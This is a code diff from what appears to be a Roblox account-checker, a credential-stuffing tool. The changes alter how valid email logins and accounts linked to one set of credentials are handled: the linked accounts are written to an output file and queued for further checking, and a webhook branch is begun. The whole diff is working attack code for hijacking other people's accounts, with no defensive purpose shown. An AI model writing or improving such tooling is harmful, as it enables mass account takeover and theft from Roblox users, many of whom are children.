@@ -236,9 +236,8 @@ class Roblox:
                     raise ValueError("Rate limited")
                 
                 if self.ctype == "Email" and "Received credentials belong to multiple accounts" in response.text:
-                    Output("SUCCESS").log(f"Valid account | {self.account[0]}")
 
-                    self.handle_multi(user_id_and_cookie)
+                    self.handle_multi(response.json())
 
                     self.checked = True
                     continue
@@ -714,6 +713,13 @@ class Roblox:
         with self.lock.get_lock():
             with open("output/multiple_linked.txt", "a", encoding="utf-8") as file:
                 file.writelines(multiple_accounts_list)
+
+            insert_index = self.counter.get_value()
+            self.accounts[insert_index:insert_index] = multiple_accounts_list
+
+        Output("MAIL_VALID").log(
+            f"Valid email | {self.account[0]} | queued {len(multiple_accounts_list)} linked accounts"
+        )
 
         if WEBHOOK_ENABLED:
             try:
